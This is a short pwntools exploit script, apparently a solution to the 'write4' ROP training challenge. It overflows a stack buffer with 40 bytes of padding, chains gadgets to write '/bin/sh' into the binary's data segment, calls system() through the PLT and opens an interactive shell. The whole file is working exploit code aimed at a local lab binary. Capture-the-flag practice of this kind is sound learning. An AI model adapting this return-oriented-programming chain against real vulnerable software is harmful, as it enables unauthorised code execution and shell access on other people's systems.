from pwn import *

mov_r15_to_r14 = 0x0000000000400820 # mov qword ptr [r14], r15 ; ret
pop_r14_r15    = 0x0000000000400890 # pop r14 ; pop r15 ; ret
pop_rdi        = 0x0000000000400893 # pop rdi ; ret

data_seg = 0x00601000

system_plt = 0x4005e0

# RIP offset is at 40
rop = "A" * 40

# Write "/bin/sh" to data_seg
rop += p64(pop_r14_r15)
rop += p64(data_seg)
rop += "/bin/sh\x00"
rop += p64(mov_r15_to_r14)

# Call system("/bin/sh")
rop += p64(pop_rdi)
rop += p64(data_seg)
rop += p64(system_plt)

# Start process and send rop chain
e = process('/home/abatchy/Desktop/tmp/write4')
print e.recv()
e.sendline(rop)
e.interactive()